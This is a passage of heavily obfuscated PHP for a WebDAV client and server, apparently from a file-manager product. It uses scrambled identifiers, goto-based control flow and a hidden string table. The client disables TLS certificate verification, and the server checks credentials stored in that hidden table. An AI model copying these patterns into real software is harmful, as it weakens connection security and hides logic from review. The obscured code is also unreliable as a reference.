$F½ß¶ßÉÑÓ); } public function propfind($aÁê¾¸ÛòÅ) { $Aö­éÒ´™‚ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->setHeader($Aö­éÒ´™‚[1751], $Aö­éÒ´™‚[83]); $this->setHeader($Aö­éÒ´™‚[1752], $Aö­éÒ´™‚[1753]); $a¨¨Œ¬àŸ¾ = $Aö­éÒ´™‚[1754]; return $this->send($Aö­éÒ´™‚[1755], $aÁê¾¸ÛòÅ, $a¨¨Œ¬àŸ¾); } public function options($aÏ°£­ç) { return $this->send($_SERVER[Ö¹ñÒÁ²÷][1756], $aÏ°£­ç); } public function get($c’ÉèÁäÚª) { return $this->send($_SERVER[Ö¹ñÒÁ²÷][212], $c’ÉèÁäÚª); } public function put($cß‚ØËğó£, $a“÷·ãé, $EÊ›åÑíÉ‘ = '') { $e÷µ´¯Æ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($EÊ›åÑíÉ‘) { $this->setHeader($e÷µ´¯Æ[1747], $e÷µ´¯Æ[921] . $EÊ›åÑíÉ‘ . $e÷µ´¯Æ[924]); } return $this->send($e÷µ´¯Æ[210], $cß‚ØËğó£, $a“÷·ãé); } protected function send($b¼¼éÂëÒå, $E…Ù‰¥», $AŒœŠ†¶ = false, $fÃêœ™¿£Â = false) { goto d§¡“Œªåê; båî¸†´¨š: $this->header = array(); return $e–‰Ë÷»±„; goto A¦¶äÂ•–; cŞ•æê‘«é: $this->setHeader($cË„ŠÅ£ÂŸ); if ($AŒœŠ†¶) { $AŒœŠ†¶ = $b”ˆ®›„®[1758] . $AŒœŠ†¶; } if (!request_url_safe($E…Ù‰¥»)) { return !1; } goto fæßÄ™ø; d§¡“Œªåê: $b”ˆ®›„® =& $_SERVER[Ö¹ñÒÁ²÷]; $cË„ŠÅ£ÂŸ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($b”ˆ®›„®[1757], $b”ˆ®›„®[50]); goto cŞ•æê‘«é; fæßÄ™ø: $c‚´›Éè°ƒ = curl_init($E…Ù‰¥»); curl_setopt($c‚´›Éè°ƒ, CURLOPT_CUSTOMREQUEST, $b¼¼éÂëÒå); curl_setopt($c‚´›Éè°ƒ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto C²Ÿõ—ƒ†–; C²Ÿõ—ƒ†–: curl_setopt($c‚´›Éè°ƒ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($c‚´›Éè°ƒ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($c‚´›Éè°ƒ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto eÌ¾©—¦Å˜; eÌ¾©—¦Å˜: curl_setopt($c‚´›Éè°ƒ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($c‚´›Éè°ƒ, CURLOPT_SSL_VERIFYHOST, !1); $e–‰Ë÷»±„ = curl_exec($c‚´›Éè°ƒ); goto båî¸†´¨š; A¦¶äÂ•–: } } class HttpDavServer { public function __construct($b¿›ôéŒ‡ã, $AÕ´œäµÇ±) { $this->root = $b¿›ôéŒ‡ã; $this->initPath($AÕ´œäµÇ±); $this->start(); } public function initPath($b—˜‚ÙÖÜƒ) { $BóòãËèÎ =& $_SERVER[Ö¹ñÒÁ²÷]; $cÜƒĞ³ª·Ş = rtrim($_SERVER[$BóòãËèÎ[1366]], $BóòãËèÎ[8]) . $BóòãËèÎ[8]; $this->urlBase = substr($cÜƒĞ³ª·Ş, 0, strpos($cÜƒĞ³ª·Ş, $b—˜‚ÙÖÜƒ) + 1); $this->urlBase = rtrim($this->urlBase, $BóòãËèÎ[8]) . $b—˜‚ÙÖÜƒ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $c”èƒ˜¤æÊ =& $_SERVER[Ö¹ñÒÁ²÷]; $EÃÎ›ÊÌŞ = HttpAuth::get(); if ($EÃÎ›ÊÌŞ[$c”èƒ˜¤æÊ[531]] == $c”èƒ˜¤æÊ[1759] && $EÃÎ›ÊÌŞ[$c”èƒ˜¤æÊ[893]] == $c”èƒ˜¤æÊ[1760]) { return !0; } HttpAuth::error(); } public function start() { goto cÌµÚ³¹†; D²‘ê¼éÏ: if (!$F¶Õ•º©Èñ) { return; } self::response($F¶Õ•º©Èñ); goto BŒ°¯Æˆ; cÌµÚ³¹†: $fëçñÀ£İÄ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->checkUser(); $b¤¿š…®á  = $fëçñÀ£İÄ[142] . HttpHeader::method(); goto aÉÜÛŒˆíí; aÉÜÛŒˆíí: if (!method_exists($this, $b¤¿š…®á )) { pr($b¤¿š…®á  . $fëçñÀ£İÄ[1761]); die; } $cƒ‰í¨ªœ¨ = array($fëçñÀ£İÄ[1762], $fëçñÀ£İÄ[1763]); if (!in_array($b¤¿š…®á , $cƒ‰í¨ªœ¨) && !$this->pathExists($this->path)) { $F¶Õ•º©Èñ = array($fëçñÀ£İÄ[1026] => 404); } else { $F¶Õ•º©Èñ = $this->{$b¤¿š…®á }(); } goto D²‘ê¼éÏ; BŒ°¯Æˆ: } public function pathGet($DŞ¬ˆÌ©ª = false) { $dÁ¶ ¨íµ =& $_SERVER[Ö¹ñÒÁ²÷]; $CÁŸ…ñùÀ£ = $DŞ¬ˆÌ©ª ? $_SERVER[$dÁ¶ ¨íµ[1764]] : $_SERVER[$dÁ¶ ¨íµ[1366]]; $CÁŸ…ñùÀ£ = KodIO::clear(rawurldecode($CÁŸ…ñùÀ£)); if (!strstr($CÁŸ…ñùÀ£, KodIO::clear($this->urlBase))) { return !1; } return substr($CÁŸ…ñùÀ£, strpos($CÁŸ…ñùÀ£, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($AßµÕ¬éëİ) { return file_exists($AßµÕ¬éëİ); } public function pathMkdir($b²”Ù£Œã) { return mkdir($b²”Ù£Œã, 511, !0); } public function pathInfo($fªï­Òàœ) { return path_info($fªï­Òàœ); } public function pathList($A¯ØÇáã‚Õ) { return path_list($A¯ØÇáã‚Õ); } public function pathOut($bóæõÜ–ÏÑ) { echo file_get_contents($bóæõÜ–ÏÑ); } public function pathPut($AÉ©¶¥ôæ†, $Bæ“§Êô‹Ç = '') { if (!$Bæ“§Êô‹Ç) { return file_put_contents($AÉ©¶¥ôæ†, $_SERVER[Ö¹ñÒÁ²÷][33]); } return move_path($Bæ“§Êô‹Ç, $AÉ©¶¥ôæ†); } public function pathRemove($eÔ¬›¨ÏÁ) { if (is_file($eÔ¬›¨ÏÁ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($E›»—Œ¤°…, $A…Û¼ÁÃÕä) { return move_path($E›»—Œ¤°…, $A…Û¼ÁÃÕä); } public function pathCopy($D‹«ƒß“, $E ¸äĞÅï) { return copy_dir($D‹«ƒß“, $E ¸äĞÅï); } public function parsePath($B„Ó¬Ñ¯µ¶) { return $B„Ó¬Ñ¯µ¶; } public function parseItem($Eƒ¯¼¦ğÊ…, $Aª…”ÚÅ›‚) { goto dÁù¤×ƒéã; dÁù¤×ƒéã: $EÈŞ“êäá¯ =& $_SERVER[Ö¹ñÒÁ²÷]; $bƒÄØØ©Ñ¥ = $this->pathGet() . $EÈŞ“êäá¯[8] . $Eƒ¯¼¦ğÊ…[$EÈŞ“êäá¯[28]]; $bƒÄØØ©Ñ¥ = $EÈŞ“êäá¯[8] . str_replace($EÈŞ“êäá¯[168], $EÈŞ“êäá¯[8], rawurlencode($bƒÄØØ©Ñ¥)); goto eéÛñ·„ßæ; D­–Ñì: $Dæ®ïÈøÍ = array($EÈŞ“êäá¯[1765] => KodIO::clear($this->urlBase . $bƒÄØØ©Ñ¥), $EÈŞ“êäá¯[106] => @gmdate($EÈŞ“êäá¯[1766], $Eƒ¯¼¦ğÊ…[$EÈŞ“êäá¯[106]]), $EÈŞ“êäá¯[183] => @gmdate($EÈŞ“êäá¯[1767], $Eƒ¯¼¦ğÊ…[$EÈŞ“êäá¯[183]]), $EÈŞ“êäá¯[77] => $Eƒ¯¼¦ğÊ…[$EÈŞ“êäá¯[77]] ? $Eƒ¯¼¦ğÊ…[$EÈŞ“êäá¯[77]] : 0); return $Dæ®ïÈøÍ; goto Aù‹î²¬Ó‚; eéÛñ·„ßæ: if ($Aª…”ÚÅ›‚) { $bƒÄØØ©Ñ¥ = $EÈŞ“êäá¯[8] . str_replace($EÈŞ“êäá¯[168], $EÈŞ“êäá¯[8], rawurlencode($this->pathGet())); } if (!trim($Eƒ¯¼¦ğÊ…[$EÈŞ“êäá¯[106]])) { $Eƒ¯¼¦ğÊ…[$EÈŞ“êäá¯[106]] = time(); } if (!trim($Eƒ¯¼¦ğÊ…[$EÈŞ“êäá¯[183]])) { $Eƒ¯¼¦ğÊ…[$EÈŞ“êäá¯[183]] = time(); } goto D­–Ñì; Aù‹î²¬Ó‚: } public function parseItemXml($b’ÇÉÇ—İ, $D½¨ƒ„ ÷) { $c»ƒ¶‘Á‰› =& $_SERVER[Ö¹ñÒÁ²÷]; $fğƒŠ‹î = $this->parseItem($b’ÇÉÇ—İ, $D½¨ƒ„ ÷); if ($b’ÇÉÇ—İ[$c»ƒ¶‘Á‰›[29]] == $c»ƒ¶‘Á‰›[76]) { $f¿ƒó‘Ãƒ = $c»ƒ¶‘Á‰›[1768]; $f¿ƒó‘Ãƒ .= $c»ƒ¶‘Á‰›[1769]; } else { $d§¹ò ‚ÁÚ = $b’ÇÉÇ—İ[$c»ƒ¶‘Á‰›[156]] ? $b’ÇÉÇ—İ[$c»ƒ¶‘Á‰›[156]] : get_path_ext($b’ÇÉÇ—İ[$c»ƒ¶‘Á‰›[28]]); $C’Í‡…åğå = get_file_mime($d§¹ò ‚ÁÚ); $f¿ƒó‘Ãƒ = $c»ƒ¶‘Á‰›[1770]; $f¿ƒó‘Ãƒ .= "\x3c\x44\72\x67\145\x74\143\x6f\156\x74\145\x6e\x74\x74\x79\160\x65\x3e{$C’Í‡…åğå}\x3c\x2f\x44\x3a\x67\145\164\x63\157\x6e\164\145\x6e\x74\164\171\160\145\76"; } return "\12\11\x9\x3c\x44\72\162\145\163\x70\x6f\156\x73\145\x3e\xa\11\11\x9\x3c\x44\72\150\162\145\x66\x3e{$fğƒŠ‹î[$c»ƒ¶‘Á‰›[1765]]}\x3c\57\x44\x3a\150\x72\145\146\76\12\11\x9\x9\x3c\104\x3a\160\x72\x6f\x70\x73\164\x61\164\x3e\xa\x9\x9\11\x9\74\x44\x3a\160\162\157\x70\x3e\xa\11\11\11\11\11\74\x44\x3a\x67\145\x74\x6c\x61\x73\164\x6d\157\x64\151\x66\151\x65\x64\x3e{$fğƒŠ‹î[$c»ƒ¶‘Á‰›[106]]}\x3c\57\x44\72\147\145\x74\154\x61\x73\x74\x6d\157\x64\151\146\x69\x65\x64\x3e\12\11\x9\x9\11\x9\x3c\104\x3a\x63\162\x65\x61\x74\151\x6f\x6e\x64\141\164\x65\x3e{$fğƒŠ‹î[$c»ƒ¶‘Á‰›[183]]}\x3c\x2f\104\x3a\x63\162\145\x61\x74\151\157\x6e\144\141\164\x65\x3e\xa\x9\11\x9\x9\x9\x3c\104\72\x67\145\x74\x63\x6f\x6e\164\145\156\164\x6c\x65\156\x67\x74\150\76{$fğƒŠ‹î[$c»ƒ¶‘Á‰›[77]]}\x3c\57\104\x3a\x67\145\164\143\157\156\164\145\x6e\x74\x6c\x65\156\147\164\150\x3e\12\11\11\x9\11\11{$f¿ƒó‘Ãƒ}\12\x9\x9\x9\11\x3c\57\104\x3a\x70\162\x6f\160\x3e\12\x9\x9\11\11\x3c\104\x3a\x73\x74\141\164\x75\x73\76\110\124\x54\x50\57\x31\56\61\40\62\60\x30\x20\x4f\113\74\57\104\x3a\163\164\141\164\165\163\x3e\12\11\11\11\x3c\57\104\72\160\x72\157\160\163\x74\141\x74\76\12\11\x9\74\x2f\104\x3a\x72\145\163\x70\157\156\x73\145\x3e"; } public function pathListMerge($C¤÷ÎƒêæŠ) { goto cíÜ‰Ó¥í; D™ÑÙ¯ğâ‚: return $F…¼Î¶©½Ê; goto Bä»‰æÈô; cíÜ‰Ó¥í: $f‚µ÷…œö =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$C¤÷ÎƒêæŠ) { return $C¤÷ÎƒêæŠ; } $A¥¬ŠÂ¼Ù = array($f‚µ÷…œö[73], $f‚µ÷…œö[74], $f‚µ÷…œö[1771]); goto dÚˆñÊ²š; dÚˆñÊ²š: $F…¼Î¶©½Ê = array(); foreach ($C¤÷ÎƒêæŠ as $C“­ßî™ã => $e•¶¤ìŒÜ) { if (!in_array($C“­ßî™ã, $A¥¬ŠÂ¼Ù) || !is_array($e•¶¤ìŒÜ)) { continue; } $F…¼Î¶©½Ê = array_merge($F…¼Î¶©½Ê, $e•¶¤ìŒÜ); } foreach ($F…¼Î¶©½Ê as &$DÀÊ’›¿¹Ÿ) { $DÀÊ’›¿¹Ÿ[$f‚µ÷…œö[28]] = str_replace($f‚µ÷…œö[8], $f‚µ÷…œö[1368], $DÀÊ’›¿¹Ÿ[$f‚µ÷…œö[28]]); } goto D™ÑÙ¯ğâ‚; Bä»‰æÈô: } public function httpPROPFIND() { goto E´ô¦ùğ¬Š; cº’ƒ©İÓ: return array($c™¼‹¨ËêÅ[1774] => 207, $c™¼‹¨ËêÅ[1775] => "\x3c\104\x3a\x6d\x75\154\164\151\163\164\x61\164\165\x73\x20\170\155\154\x6e\x73\72\104\x3d\x22\x44\101\x56\72\x22\x3e\xa{$dÏŒİ®‡é†}\12\74\x2f\x44\72\x6d\165\154\164\x69\163\x74\x61\x74\165\163\x3e"); goto Cì‰¬¼¢Ä; eƒÂñíï½: $c¨¢‘™†‰Â = $C…¹š’ëºØ[$c™¼‹¨ËêÅ[1772]]; if (!is_array($e”ÖÎ–Î‚) || $c¨¢‘™†‰Â[$c™¼‹¨ËêÅ[1773]] === !1) { return array($c™¼‹¨ËêÅ[1774] => 404, $c™¼‹¨ËêÅ[1775] => $c™¼‹¨ËêÅ[1776]); } $dŠ¸ã±Ğ“ = $c¨¢‘™†‰Â[$c™¼‹¨ËêÅ[29]] == $c™¼‹¨ËêÅ[163] || HttpHeader::get($c™¼‹¨ËêÅ[1751]) == $c™¼‹¨ËêÅ[464]; goto bô‹éà·î¥; E´ô¦ùğ¬Š: $c™¼‹¨ËêÅ =& $_SERVER[Ö¹ñÒÁ²÷]; $C…¹š’ëºØ = $this->pathList($this->path); $e”ÖÎ–Î‚ = $this->pathListMerge($C…¹š’ëºØ); goto eƒÂñíï½; bô‹éà·î¥: if ($dŠ¸ã±Ğ“) { $e”ÖÎ–Î‚ = array($c¨¢‘™†‰Â); } else { $c¨¢‘™†‰Â[$c™¼‹¨ËêÅ[28]] = $c™¼‹¨ËêÅ[33]; $e”ÖÎ–Î‚ = array_merge(array($c¨¢‘™†‰Â), $e”ÖÎ–Î‚); } $dÏŒİ®‡é† = $c™¼‹¨ËêÅ[33]; foreach ($e”ÖÎ–Î‚ as $eƒ¤õ‚˜) { $dÏŒİ®‡é† .= $this->parseItemXml($eƒ¤õ‚˜, $dŠ¸ã±Ğ“); } goto cº’ƒ©İÓ; Cì‰¬¼¢Ä: } public function httpHEAD() { $EÜ´ÕÈ‰«‡ =& $_SERVER[Ö¹ñÒÁ²÷]; $a¥…ÙÒáÍ­ = $this->pathInfo($this->path); if (!$a¥…ÙÒáÍ­ || $a¥…ÙÒáÍ­[$EÜ´ÕÈ‰«‡[29]] == $EÜ´ÕÈ‰«‡[76]) { return array($EÜ´ÕÈ‰«‡[1026] => 200, $EÜ´ÕÈ‰«‡[1193] => array($EÜ´ÕÈ‰«‡[1777])); } return array($EÜ´ÕÈ‰«‡[1026] => 200, $EÜ´ÕÈ‰«‡[1193] => array($EÜ´ÕÈ‰«‡[1778], $EÜ´ÕÈ‰«‡[135], $EÜ´ÕÈ‰«‡[1779] . $a¥…ÙÒáÍ­[$EÜ´ÕÈ‰«‡[77]], $EÜ´ÕÈ‰«‡[1780] . get_file_mime($a¥…ÙÒáÍ­[$EÜ´ÕÈ‰«‡[156]]), $EÜ´ÕÈ‰«‡[131] . gmdate($EÜ´ÕÈ‰«‡[1766], $a¥…ÙÒáÍ­[$EÜ´ÕÈ‰«‡[1240]]) . $EÜ´ÕÈ‰«‡[1781], $EÜ´ÕÈ‰«‡[1782])); } public function httpOPTIONS() { $a¬¾—¹Òó­ =& $_SERVER[Ö¹ñÒÁ²÷]; return array($a¬¾—¹Òó­[1026] => 200, $a¬¾—¹Òó­[1193] => array($a¬¾—¹Òó­[1783], $a¬¾—¹Òó­[1784], $a¬¾—¹Òó­[1785], $a¬¾—¹Òó­[1249])); } public function httpPROPPATCH() { $Aºµ×ËëÃƒ =& $_SERVER[Ö¹ñÒÁ²÷]; $D‡óåÕßÕ = $Aºµ×ËëÃƒ[1786] . $_SERVER[$Aºµ×ËëÃƒ[1366]] . $Aºµ×ËëÃƒ[1787]; return array($Aºµ×ËëÃƒ[1774] => 207, $Aºµ×ËëÃƒ[1775] => "\74\104\x3a\x6d\165\154\x74\151\163\164\x61\x74\165\163\x20\x78\155\x6c\x6e\x73\72\x44\75\42\x44\101\x56\x3a\x22\76\12{$D‡óåÕßÕ}\xa\74\57\104\x3a\x6d\165\154\x74\x69\x73\164\141\164\165\x73\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $bÜ„ºº¯‘ =& $_SERVER[Ö¹ñÒÁ²÷]; $b±À¡¼†¼œ = $this->uploadFile(); if ($b±À¡¼†¼œ) { $EÒÑÆøÃñ = 204; } else { $b±À¡¼†¼œ = $bÜ„ºº¯‘[33]; $EÒÑÆøÃñ = 201; } $c£ÑøæÓÕ = $this->pathPut($this->path, $b±À¡¼†¼œ); if ($c£ÑøæÓÕ == !1) { $EÒÑÆøÃñ = 404; } return array($bÜ„ºº¯‘[1774] => $EÒÑÆøÃñ); } private function uploadFile() { goto CÓ‘—ã½®Ô; DÃÕÂù¸âö: while (!feof($B¨‘Ã¢‰±Û)) { fwrite($E¹ïÀ®Ö, fread($B¨‘Ã¢‰±Û, 1024 * 200)); } fclose($B¨‘Ã¢‰±Û); fclose($E¹ïÀ®Ö); goto f ãâ„–é‡; aõÏ¶Ü‰¸: $E¹ïÀ®Ö = @fopen($cà©—Ä§Ò±, $bø£¥÷½Ñ[1497]); $B¨‘Ã¢‰±Û = @fopen($bø£¥÷½Ñ[1789], $bø£¥÷½Ñ[1496]); if (!$B¨‘Ã¢‰±Û || !$E¹ïÀ®Ö) { @unlink($cà©—Ä§Ò±); return !1; } goto DÃÕÂù¸âö; CÓ‘—ã½®Ô: $bø£¥÷½Ñ =& $_SERVER[Ö¹ñÒÁ²÷]; @mk_dir(TEMP_FILES); $cà©—Ä§Ò± = TEMP_FILES . $bø£¥÷½Ñ[1788] . rand_string(32); goto aõÏ¶Ü‰¸; f ãâ„–é‡: if (@filesize($cà©—Ä§Ò±) > 0) { return $cà©—Ä§Ò±; } @unlink($cà©—Ä§Ò±); return !1; goto C¬ßŒŒÄÖÎ; C¬ßŒŒÄÖÎ: } public function httpMKCOL() { $a‡á—•˜à› =& $_SERVER[Ö¹ñÒÁ²÷]; if ($this->pathExists($this->path)) { return array($a‡á—•˜à›[1026] => 409); } $fØñ¼§¶ôì = $this->pathMkdir($this->path); return array($a‡á—•˜à›[1026] => $fØñ¼§¶ôì ? 201 : 403); } public function httpMOVE() { $C†Äš¨ğİ‘ =& $_SERVER[Ö¹ñÒÁ²÷]; $eİï–¶Æµ° = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$C†Äš¨ğİ‘[1790]])) { $C½¬¤‡²®[$C†Äš¨ğİ‘[1791]] = $_SERVER[$C†Äš¨ğİ‘[1790]] == $C†Äš¨ğİ‘[1792]; } $E¿³Ş¸°‘• = $this->pathMove($this->path, $eİï–¶Æµ°); return array($C†Äš¨ğİ‘[1026] => $E¿³Ş¸°‘• ? 201 : 404); } public function httpCOPY() { $FâÃªøÄÃŒ = $this->parsePath($this->pathGet(!0)); $B¾ö»øÎÓŒ = $this->pathCopy($this->path, $FâÃªøÄÃŒ); return array($_SERVER[Ö¹ñÒÁ²÷][1026] => $B¾ö»øÎÓŒ ? 201 : 404); } public function httpDELETE() { $c¥¿å§ãÄÜ = $this->pathRemove($this->path); return array($_SERVER[Ö¹ñÒÁ²÷][1026] => $c¥¿å§ãÄÜ ? 200 : 503); } public function httpLOCK() { $d¸ôêÙªš„ =& $_SERVER[Ö¹ñÒÁ²÷]; $fİ•Ğİ¼õ‘ = md5($this->path); $dçÎŒĞÜÖÒ = $d¸ôêÙªš„[1793] . $this->xmlGet($d¸ôêÙªš„[1794]) . $d¸ôêÙªš„[1795] . $fİ•Ğİ¼õ‘ . $d¸ôêÙªš„[1796]; return array($d¸ôêÙªš„[1026] => 200, $d¸ôêÙªš„[1193] => array($d¸ôêÙªš„[1797] . $fİ•Ğİ¼õ‘, $d¸ôêÙªš„[1798]), $d¸ôêÙªš„[1799] => $dçÎŒĞÜÖÒ); } public function httpUNLOCK() { return array($_SERVER[Ö¹ñÒÁ²÷][1026] => 204); } public function xmlGet($AŒâÎÆ¸¥‚) { goto Fµ¼ˆáß¬; Dõì‹Ì¢å®: return $Dİè´éëñË[33]; goto b«Øã£Œ§; Fµ¼ˆáß¬: $Dİè´éëñË =& $_SERVER[Ö¹ñÒÁ²÷]; static $a…¹ñ™«´½ = false; if (!$a…¹ñ™«´½) { $CÄØøáŒµ¦ = file_get_contents($Dİè´éëñË[1800]); $a…¹ñ™«´½ = new DOMDocument(); $a…¹ñ™«´½->loadXML($CÄØøáŒµ¦); } goto CÖ ‡Ñˆ•¾; CÖ ‡Ñˆ•¾: $D£‰‘Ù øÜ = array_shift(explode($Dİè´éëñË[8], $AŒâÎÆ¸¥‚)); $a¾·øÂ²“² = $a…¹ñ™«´½->getElementsByTagNameNS($Dİè´éëñË[1801], $D£‰‘Ù øÜ); if ($a¾·øÂ²“²) { return $a¾·øÂ²“²[0]->nodeValue; } goto Dõì‹Ì¢å®; b«Øã£Œ§: } public static function response($C±¦è•«´§) { goto FÍËÏ—ÒÏ©; FÍËÏ—ÒÏ©: $dîÛ°«‚ä =& $_SERVER[Ö¹ñÒÁ²÷]; $C‘ßğ•öÍ­ = is_array($C±¦è•«´§[$dîÛ°«‚ä[1193]]) ? $C±¦è•«´§[$dîÛ°«‚ä[1193]] : array(); $C‘ßğ•öÍ­[] = HttpHeader::code($C±¦è•«´§[$dîÛ°«‚ä[1026]]); goto eªÛª°ˆ; a§—™Ü¸Ô–: if (is_string($C±¦è•«´§[$dîÛ°«‚ä[1799]])) { header($dîÛ°«‚ä[1802]); $DÏœŒïÙÂî = $dîÛ°«‚ä[1803] . $dîÛ°«‚ä[213] . $C±¦è•«´§[$dîÛ°«‚ä[1799]]; echo $DÏœŒïÙÂî; } goto bÛìéùÍí¡; eªÛª°ˆ: $C‘ßğ•öÍ­[] = $dîÛ°«‚ä[1741]; $C‘ßğ•öÍ­[] = $dîÛ°«‚ä[1742]; foreach ($C‘ßğ•öÍ­ as $c»„¶†½Ş) { header($c»„¶†½Ş); } goto a§—™Ü¸Ô–; bÛìéùÍí¡: } } class HttpHeader { public static $_headers = array("\x48\157\x73\x74" => "\x48\x54\124\120\x5f\x48\117\123\124", "\125\x73\x65\x72\55\101\x67\x65\156\x74" => "\110\124\124\x50\x5f\x55\x53\105\122\x5f\x41\107\x45\116\124", "\x43\x6f\156\x74\145\156\x74\55\x54\x79\x70\x65" => "\110\x54\124\120\137\x43\117\116\124\x45\116\x54\137\124\131\x50\105", "\x43\x6f\x6e\x74\145\x6e\164\x2d\x4c\x65\x6e\x67\164\150" => "\110\124\124\120\x5f\103\117\116\124\105\116\x54\x5f\114\105\116\x47\124\x48", "\x44\145\x70\164\x68" => "\110\124\x54\120\137\104\x45\x50\124\x48", "\105\170\160\x65\143\164" => "\x48\124\x54\120\x5f\x45\130\x50\x45\103\124", "\x49\146\55\x4e\157\x6e\145\x2d\x4d\141\x74\143\x68" => "\x48\124\x54\x50\x5f\x49\106\137\116\x4f\x4e\x45\137\115\101\124\x43\110", "\x49\146\55\x4d\141\164\x63\x68" => "\110\124\x54\x50\137\x49\106\137\x4d\x41\x54\103\x48", "\x49\146\55\122\x61\x6e\x67\x65" => "\110\x54\x54\120\137\111\x46\137\x52\101\116\x47\105", "\x4c\141\163\x74\x2d\115\x6f\144\x69\146\151\x65\x64" => "\110\124\124\120\x5f\x4c\x41\x53\x54\x5f\x4d\x4f\104\x49\x46\x49\x45\x44", "\111\x66\55\x4d\x6f\x64\151\x66\151\145\144\55\x53\x69\156\143\x65" => "\x48\124\124\120\137\111\x46\x5f\x4d\x4f\104\x49\x46\111\x45\104\x5f\123\x49\x4e\x43\105", "\111\146\55\x55\156\x6d\x6f\144\x69\146\151\145\144\55\x53\x69\156\x63\x65" => "\110\124\x54\120\x5f\x49\106\137\125\116\x4d\x4f\104\x49\x46\x49\105\x44\x5f\x53\x49\x4e\x43\x45", "\x52\141\x6e\x67\145" => "\110\x54\x54\x50\137\122\x41\x4e\x47\x45", "\x54\x69\x6d\145\x6f\165\164" => "\110\x54\124\x50\137\x54\x49\x4d\105\117\x55\124", "\111\146" => "\x48\x54\x54\120\137\x49\106", "\114\x6f\x63\x6b\x2d\124\157\153\145\x6e" => "\x48\124\124\x50\137\x4c\117\x43\x4b\x5f\124\117\x4b\105\x4e", "\117\x76\x65\162\x77\x72\x69\x74\x65" => "\110\x54\124\x50\x5f\117\x56\105\122\127\122\x49\x54\x45", "\104\x65\163\x74\151\156\x61\164\x69\x6f\156" => "\110\124\x54\x50\137\x44\105\x53\x54\111\116\x41\124\111\x4f\116", "\122\x65\x71\x75\145\x73\x74\55\x49\144" => "\122\x45\x51\x55\105\123\124\137\x49\x44", "\x52\145\161\165\x65\163\164\55\102\157\x64\x79\x2d\x46\151\x6c\x65" => "\x52\105\121\x55\105\123\x54\x5f\x42\117\104\131\137\106\x49\114\x45", "\122\x65\144\x69\x72\145\143\x74\55\123\164\x61\x74\165\x73" => "\x52\x45\x44\x49\122\105\x43\124\x5f\123\124\x41\x54\125\x53"); public static function init() { static $f±šçë÷¡ò = false; if ($f±šçë÷¡ò) { return; } foreach ($_SERVER as $Eİ¾Ü ê => $d†£ŒÒˆµ) { $Eİ¾Ü ê = strtoupper($Eİ¾Ü ê); if (!array_key_exists($Eİ¾Ü ê, $_SERVER)) { continue; } $_SERVER[$Eİ¾Ü ê] = $d†£ŒÒˆµ; } foreach (self::$_headers as $Eİ¾Ü ê => $AùÕèÇÕèà) { if (!array_key_exists($Eİ¾Ü ê, $_SERVER)) { continue; } $_SERVER[$Eİ¾Ü ê] = $_SERVER[$AùÕèÇÕèà]; $_SERVER[strtoupper($Eİ¾Ü ê)] = $_SERVER[$AùÕèÇÕèà]; } } public static function get($aŒ„ºâŸ°÷) { self::init(); return $_SERVER[$aŒ„ºâŸ°÷] ? $_SERVER[$aŒ„ºâŸ°÷] : $_SERVER[$_SERVER[Ö¹ñÒÁ²÷][1804] . strtoupper($aŒ„ºâŸ°÷)]; } public static function method() { return strtoupper(self::get($_SERVER[Ö¹ñÒÁ²÷][150])); } public static function length() { $EĞ´Ì‚‘ =& $_SERVER[Ö¹ñÒÁ²÷]; $Bœ¶›‹‘É = self::get($EĞ´Ì‚‘[1805]); if (!$Bœ¶›‹‘É) { $Bœ¶›‹‘É = self::get($EĞ´Ì‚‘[1132]); } return $Bœ¶›‹‘É; } public static function range() { $a‡’Íõº«¨ =& $_SERVER[Ö¹ñÒÁ²÷]; $fÏÖÓÓÙÃ = self::get($a‡’Íõº«¨[194]); if (!$fÏÖÓÓÙÃ) { return !1; } if (!preg_match($a‡’Íõº«¨[1806], $fÏÖÓÓÙÃ, $d“ªë‰íì«)) { return !1; } if ($d“ªë‰íì«[1] === $a‡’Íõº«¨[33] && $d“ªë‰íì«[2] === $a‡’Íõº«¨[33]) { return !1; } return array($d“ªë‰íì«[1] !== $a‡’Íõº«¨[33] ? $d“ªë‰íì«[1] : null, $d“ªë‰íì«[2] !== $a‡’Íõº«¨[33] ? $d“ªë‰íì«[2] : null); } public static $statusCode = array("\61\x30\60" => "\103\x6f\x6e\x74\151\156\165\145", "\x31\x30\x31" => "\123\167\151\164\x63\x68\x69\x6e\147\x20\x50\x72\x6f\x74\x6f\x63\157\x6c", "\61\x30\62" => "\x50\x72\157\143\x65\163\163\x69\x6e\x67", "\61\x30\x33" => "\x45\x61\162\x6c\171\40\x48\151\x6e\x74\163", "\x32\x30\x30" => "\x4f\113", "\62\60\x31" => "\103\x72\145\x61\164\x65\144", "\x32\x30\62" => "\101\x63\143\x65\x70\x74\145\144", "\x32\60\x33" => "\116\x6f\x6e\x2d\101\165\x74\150\x6f\x72\151\x74\x61\x74\151\166\x65\40\x49\x6e\x66\157\x72\x6d\141\x74\x69\157\x6e", "\62\x30\x34" => "\x4e\x6f\x20\x43\x6f\x6e\164\145\x6e\x74", "\62\60\65" => "\122\x65\163\x65\164\x20\x43\157\156\164\x65\x6e\x74", "\62\60\66" => "\x50\141\x72\164\x69\141\154\x20\x43\157\x6e\164\145\156\x74", "\x32\x30\67" => "\115\x75\x6c\164\x69\x2d\x53\x74\x61\x74\x75\x73", "\x33\x30\x30" => "\115\x75\154\164\x69\160\x6c\x65\x20\103\x68\157\151\143\x65\163", "\63\60\x31" => "\x4d\x6f\x76\145\x64\40\120\145\x72\155\141\x6e\145\x6e\164\154\171", "\63\60\x32" => "\106\x6f\165\x6e\144", "\x33\60\63" => "\123\145\x65\40\x4f\x74\x68\x65\162", "\x33\x30\x34" => "\116\x6f\x74\x20\115\157\x64\x69\x66\x69\145\144", "\63\x30\x35" => 